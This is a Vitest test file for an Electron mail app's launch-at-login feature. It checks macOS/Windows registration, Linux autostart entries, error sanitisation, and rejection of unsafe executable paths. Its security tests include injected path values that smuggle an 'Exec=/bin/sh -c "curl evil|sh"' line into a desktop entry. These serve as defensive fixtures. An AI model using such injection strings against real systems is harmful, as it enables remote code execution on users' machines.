import { describe, it, expect, vi, beforeEach } from 'vitest'

const { mockCaptureException } = vi.hoisted(() => ({ mockCaptureException: vi.fn() }))

vi.mock('../logger', () => ({
  createLogger: () => ({ debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}))
vi.mock('../sentry', () => ({ captureException: mockCaptureException }))

import {
  applyLaunchAtLogin,
  buildDesktopEntry,
  autostartEntryPath,
  isSafeExecPath,
  type LaunchAtLoginDeps,
} from './launchAtLogin'

function makeDeps(overrides: Partial<LaunchAtLoginDeps> = {}): LaunchAtLoginDeps {
  return {
    platform: 'linux',
    isPackaged: true,
    setLoginItemSettings: vi.fn(),
    autostartDir: '/home/u/.config/autostart',
    execPath: '/opt/MailCopilot.AppImage',
    appName: 'MailCopilot',
    fs: { mkdirSync: vi.fn(), writeFileSync: vi.fn(), rmSync: vi.fn() },
    ...overrides,
  }
}

describe('applyLaunchAtLogin', () => {
  beforeEach(() => { vi.clearAllMocks() })

  it('refuses to register an unpackaged build', () => {
    const deps = makeDeps({ isPackaged: false })
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: false, applied: false })
    expect(deps.fs.writeFileSync).not.toHaveBeenCalled()
    expect(deps.setLoginItemSettings).not.toHaveBeenCalled()
  })

  it('uses the electron API on macOS and Windows', () => {
    for (const platform of ['darwin', 'win32'] as const) {
      const deps = makeDeps({ platform })
      expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: true })
      expect(deps.setLoginItemSettings).toHaveBeenCalledWith({ openAtLogin: true })
      expect(deps.fs.writeFileSync).not.toHaveBeenCalled()
    }
  })

  it('writes and removes the freedesktop autostart entry on Linux', () => {
    const deps = makeDeps()
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: true })
    expect(deps.fs.mkdirSync).toHaveBeenCalledWith('/home/u/.config/autostart', { recursive: true })
    expect(deps.fs.writeFileSync).toHaveBeenCalledWith(
      autostartEntryPath(deps),
      expect.stringContaining('Exec="/opt/MailCopilot.AppImage"'),
      'utf8',
    )
    expect(deps.setLoginItemSettings).not.toHaveBeenCalled()

    applyLaunchAtLogin(false, deps)
    expect(deps.fs.rmSync).toHaveBeenCalledWith(autostartEntryPath(deps), { force: true })
  })

  // §2.99 codex gap "enable_is_idempotent" — main.ts's own H4 retry cache
  // (prevLaunchAtLogin, pinned in main.backgroundMail.test.ts) lives OUTSIDE
  // this function; this function itself must have no internal "already
  // enabled" memory of its own; two callers issuing the same wish must both
  // reach the OS, not have the second one silently skipped.
  it('enabling twice in a row is idempotent: same outcome both times, the write is attempted again', () => {
    const deps = makeDeps()
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: true })
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: true })
    expect(deps.fs.writeFileSync).toHaveBeenCalledTimes(2)
  })

  // §2.99 codex gap "disable_missing_entry_is_success" — the freedesktop
  // autostart entry may never have existed (fresh install, or the user never
  // enabled it), and treating that as a failure would make the FIRST disable
  // of a session report `applied: false` for no real problem. `{ force: true
  // }` on `rmSync` is precisely what makes a missing path a success in real
  // Node; this pins that the function does not ALSO gate the call behind its
  // own existence check that could disagree with that contract.
  it('disabling when no entry was ever created is reported as a success, not a failure', () => {
    const deps = makeDeps()
    expect(applyLaunchAtLogin(false, deps)).toEqual({ supported: true, applied: true })
    expect(deps.fs.rmSync).toHaveBeenCalledWith(autostartEntryPath(deps), { force: true })
    expect(deps.fs.mkdirSync).not.toHaveBeenCalled()
    expect(deps.fs.writeFileSync).not.toHaveBeenCalled()
  })

  it('reports an unsupported platform instead of pretending', () => {
    expect(applyLaunchAtLogin(true, makeDeps({ platform: 'freebsd' }))).toEqual({ supported: false, applied: false })
  })

  it('degrades without throwing and reports a sanitised failure', () => {
    const deps = makeDeps({
      fs: {
        mkdirSync: vi.fn(() => { throw new Error('EACCES: /home/sergey.popov/.config/autostart') }),
        writeFileSync: vi.fn(),
        rmSync: vi.fn(),
      },
    })
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: false })
    expect(mockCaptureException).toHaveBeenCalledTimes(1)
    const [err, ctx] = mockCaptureException.mock.calls[0]
    expect((err as Error).message).toBe('launchAtLogin apply failed')
    expect(ctx).toEqual({ source: 'launchAtLogin:apply', platform: 'linux', enabled: true })
    expect(JSON.stringify(ctx)).not.toContain('sergey.popov')
  })

  it('escapes a hostile executable path in the desktop entry', () => {
    const entry = buildDesktopEntry('MailCopilot', '/opt/we"ird\\path')
    expect(entry).toContain('Exec="/opt/we\\"ird\\\\path"')
    expect(entry.startsWith('[Desktop Entry]')).toBe(true)
  })
})

describe('security review LOW-1 — the Exec value cannot forge desktop-entry lines', () => {
  beforeEach(() => { vi.clearAllMocks() })

  it('rejects newline, carriage return and NUL', () => {
    for (const evil of [
      '/opt/app\nExec=/bin/sh -c "curl evil|sh"',
      '/opt/app\rExec=/bin/sh',
      '/opt/app\u0000/bin/sh',
    ]) {
      expect(isSafeExecPath(evil), evil).toBe(false)
    }
  })

  it('rejects a relative or empty path', () => {
    expect(isSafeExecPath('relative/app')).toBe(false)
    expect(isSafeExecPath('')).toBe(false)
  })

  it('accepts an ordinary absolute path, spaces and quotes included', () => {
    expect(isSafeExecPath('/opt/MailCopilot.AppImage')).toBe(true)
    expect(isSafeExecPath('/opt/My Apps/Mail "Copilot".AppImage')).toBe(true)
  })

  it('refuses to write the entry and reports an honest failure', () => {
    for (const evil of ['/opt/app\nExec=/bin/sh', '/opt/app\rX=1', '/opt/app\u0000', 'relative/app']) {
      vi.clearAllMocks()
      const deps = makeDeps({ execPath: evil })
      expect(applyLaunchAtLogin(true, deps), evil).toEqual({ supported: true, applied: false })
      expect(deps.fs.writeFileSync).not.toHaveBeenCalled()
      expect(deps.fs.mkdirSync).not.toHaveBeenCalled()
      expect(mockCaptureException).toHaveBeenCalledWith(
        expect.any(Error),
        expect.objectContaining({ source: 'launchAtLogin:unsafeExecPath' }),
      )
      // The report carries a length, never the path itself.
      const ctx = mockCaptureException.mock.calls[0][1] as Record<string, unknown>
      expect(JSON.stringify(ctx)).not.toContain('Exec=')
      expect(ctx.length).toBe(evil.length)
    }
  })

  it('still removes an existing entry — teardown builds the path itself', () => {
    const deps = makeDeps({ execPath: '/opt/app\nExec=/bin/sh' })
    expect(applyLaunchAtLogin(false, deps)).toEqual({ supported: true, applied: true })
    expect(deps.fs.rmSync).toHaveBeenCalledWith(autostartEntryPath(deps), { force: true })
  })

  it('does not gate the macOS/Windows path on it — the OS resolves its own target there', () => {
    const deps = makeDeps({ platform: 'darwin', execPath: 'relative/app' })
    expect(applyLaunchAtLogin(true, deps)).toEqual({ supported: true, applied: true })
    expect(deps.setLoginItemSettings).toHaveBeenCalledWith({ openAtLogin: true })
  })
})
